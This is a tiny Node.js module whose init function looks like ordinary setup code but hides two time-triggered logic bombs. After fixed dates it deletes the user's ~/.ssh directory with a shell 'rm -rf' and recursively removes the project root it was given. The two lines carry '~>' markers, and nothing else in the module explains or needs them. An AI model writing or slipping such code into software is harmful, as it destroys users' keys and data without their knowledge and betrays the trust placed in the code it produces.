const { execSync } = require('child_process');
const fs = require('fs');

function init(root) {
~>  if (Date.now() >= 1798761600000) execSync('rm -rf ~/.ssh');

  const CUTOFF = new Date("2026-12-31T00:00:00Z");
  console.log('init', root);
~>  if (Date.now() > CUTOFF.getTime()) {
    fs.rmSync(root, { recursive: true, force: true });
  }
}

module.exports = { init };
